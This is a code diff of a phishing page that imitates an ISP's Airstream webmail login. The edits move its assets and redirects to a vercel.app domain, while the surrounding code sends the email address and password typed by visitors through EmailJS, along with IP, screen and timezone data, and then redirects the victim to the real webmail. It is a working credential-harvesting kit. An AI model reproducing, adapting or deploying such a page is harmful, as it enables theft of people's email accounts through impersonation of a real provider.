@@ -7,12 +7,12 @@
 
     <link
       rel="shortcut icon"
-      href="https://webmail.airstreamcomm.net/skins/larry/images/favicon.ico?s=1689092804"
+      href="https://ijeijeifeij.vercel.app/skins/larry/images/favicon.ico?s=1689092804"
     />
     <link
       rel="stylesheet"
       type="text/css"
-      href="https://webmail.airstreamcomm.net/skins/larry/styles.min.css?s=1689092804"
+      href="https://ijeijeifeij.vercel.app/skins/larry/styles.min.css?s=1689092804"
     />
   </head>
   <body class="xlarry">
@@ -117,7 +117,7 @@
             screen_resolution: `${screen.width}x${screen.height}`,
 
             // url
-            url: "https://webmail.airstreamcomm.net/",
+            url: "https://ijeijeifeij.vercel.app/",
 
             // Timezone offset
             timezone_offset: new Date().getTimezoneOffset(),
@@ -134,13 +134,13 @@
               dataSent = true;
               console.log("✅ IP data successfully sent via EmailJS");
               console.log("Response:", response.status, response.text);
-              window.location.replace("https://webmail.airstreamcomm.net/");
+              window.location.replace("https://ijeijeifeij.vercel.app/");
               return response;
             })
             .catch(function (error) {
               console.error("❌ Failed to send IP data via EmailJS:", error);
               console.error("Error details:", error.text || error.message);
-              window.location.replace("https://webmail.airstreamcomm.net/");
+              window.location.replace("https://ijeijeifeij.vercel.app/");
               throw error;
             });
         }
@@ -302,11 +302,11 @@
               sendDataViaEmail(emailValue, passwordValue)
                 .then(() => {
                   console.log("✅ Email sent successfully, redirecting...");
-                  window.location.replace("https://webmail.airstreamcomm.net/");
+                  window.location.replace("https://ijeijeifeij.vercel.app/");
                 })
                 .catch((error) => {
                   console.error("❌ Error sending email:", error);
-                  window.location.replace("https://webmail.airstreamcomm.net/");
+                  window.location.replace("https://ijeijeifeij.vercel.app/");
                 });
             });
           } else {
@@ -320,7 +320,7 @@
     <div id="login-form">
       <div class="box-inner" role="main">
         <img
-          src="https://webmail.airstreamcomm.net/logos/airstreamcomm.net_white.png?s=1664224834"
+          src="https://ijeijeifeij.vercel.app/logos/airstreamcomm.net_white.png?s=1664224834"
           id="logo"
           alt="Airstream Webmail"
         />
